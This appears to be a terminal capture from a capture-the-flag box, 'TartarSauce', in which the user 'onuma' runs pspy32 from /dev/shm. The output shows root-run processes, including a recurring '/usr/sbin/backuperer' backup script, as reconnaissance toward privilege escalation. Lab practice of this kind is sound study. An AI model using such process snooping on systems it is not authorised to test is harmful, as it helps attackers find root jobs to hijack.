onuma@TartarSauce:/dev/shm$ ./pspy32
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2021/03/30 12:24:20 CMD: UID=0    PID=992    | /usr/lib/policykit-1/polkitd --no-debug
2021/03/30 12:24:54 CMD: UID=0    PID=3469   |
2021/03/30 12:24:54 CMD: UID=0    PID=3471   |
2021/03/30 12:24:54 CMD: UID=0    PID=3472   |
2021/03/30 12:24:54 CMD: UID=0    PID=3474   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3475   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3476   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3477   | /bin/bash /usr/sbin/backuperer
2021/03/30 12:24:54 CMD: UID=0    PID=3478   |
2021/03/30 12:24:54 CMD: UID=0    PID=3480   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3481   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3482   |
2021/03/30 12:24:54 CMD: UID=0    PID=3483   | /bin/bash /usr/sbin/backuperer
2021/03/30 12:24:54 CMD: UID=0    PID=3484   | /usr/bin/printf -
2021/03/30 12:24:54 CMD: UID=0    PID=3485   |
2021/03/30 12:24:54 CMD: UID=0    PID=3487   | /bin/bash /usr/sbin/backuperer
